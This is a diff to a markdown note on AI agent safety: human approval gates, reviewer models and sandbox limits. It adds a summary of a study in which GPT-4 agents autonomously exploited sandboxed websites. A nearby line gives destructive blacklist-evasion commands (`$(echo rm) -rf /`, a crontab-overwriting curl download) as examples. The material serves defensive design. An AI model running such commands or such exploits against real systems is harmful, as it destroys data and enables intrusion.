@@ -14,6 +14,8 @@ sources:
   - "Faldor, Singh, Raileanu, A team of Gemini 4 Argon agents beats Minecraft (2026), arXiv 2610.22319 — sources/faldor-2026-team-gemini-4-argon-agents.pdf"
   - "Michael Albada, Building Applications with AI Agents (O'Reilly, 2025), ch. 12"
   - "Denis Rothman, Context Engineering for Multi-Agent Systems (Packt, 2025), ch. 8"
+  - https://arxiv.org/abs/2402.06664
+  - https://www.microsoft.com/en-us/research/uploads/prod/2024/12/HCAI_Agents.pdf
 confidence: high
 cleaned: 2026-07-30
 ---
@@ -182,6 +184,8 @@ The human gate has failure modes of its own (*Building Applications with AI Agen
 
 Albada's mitigations are clear escalation paths, adaptive alerting and ongoing operator training. Gating only irreversible actions is what keeps alert fatigue down in the first place.
 
+Bansal et al. place the gate on a timeline. The agent tells the user what it is about to do (ask before anything expensive, irreversible or against stated preferences), what it is doing now (so the user can halt it), and afterwards what side effects it caused and whether the goal was met ([Bansal et al., 2024-12](https://www.microsoft.com/en-us/research/uploads/prod/2024/12/HCAI_Agents.pdf), challenges A2–A5). Their over-communication example is alert fatigue in miniature. A social-media agent sent dozens of routine updates a day, and the one that mattered (a post moved onto a sensitive industry date) was lost among them. The paper is a position piece built from the authors' experience building agents and multi-agent systems, with no user study, so it names the problems rather than measuring them.
+
 ### Reviewing calls before they run
 
 When a human can't be in every loop, put a second model in front of risky calls. Li describes two shapes:
@@ -212,6 +216,8 @@ Prompt-injection filtering barely helps. Li's aim (ch. 5) is that an injected ag
 | **Mounts** | Source read-only or a writable copy; a separate writable workspace; **never** mount `~/.ssh`, keys or tokens. Data the agent can't see, it can't leak |
 | **Quotas** | CPU, memory, disk and wall clock, with a **structured** kill message ("terminated after 120 s; last output: …") so the agent can change strategy |
 | **Long-lived sessions** | Keep the terminal session inside the sandbox only. Recover across days from snapshots or rebuild scripts, never by extending the sandbox's life |
+
+The agent's ordinary toolkit is already an attack kit, which is why egress matters even when nobody injects anything. A GPT-4 agent given only a headless browser, a terminal, a Python interpreter, six public web-hacking documents and a "be creative, persist" prompt exploited 11 of 15 sandboxed website vulnerabilities (73.3% pass@5, 42.7% pass@1), including a blind SQL union attack of about 38 actions. It cost about $9.81 per site, and the agent was never told which vulnerability to look for ([arXiv:2402.06664](https://arxiv.org/abs/2402.06664) (Fang et al., 2024-02)). GPT-3.5 managed 6.7%, and all eight open models tested scored 0%, mostly because their tool calls failed. The sites were built by the authors, and the prompt and documents were withheld. In the wild the agent found one XSS bug across about 50 hand-picked old sites. Treat the numbers as a 2024 floor on what a frontier agent with open egress can do to whatever it can reach.
 
 **Parse commands semantically; don't keyword-match.** Shell composition defeats blacklists: `$(echo rm) -rf /`, `find / -name '*.log' -exec rm {} \;`, `curl -o /etc/crontab http://…`. A production gate parses each command's flags and arguments, including which flags consume the next argument, to find the real effect.
 
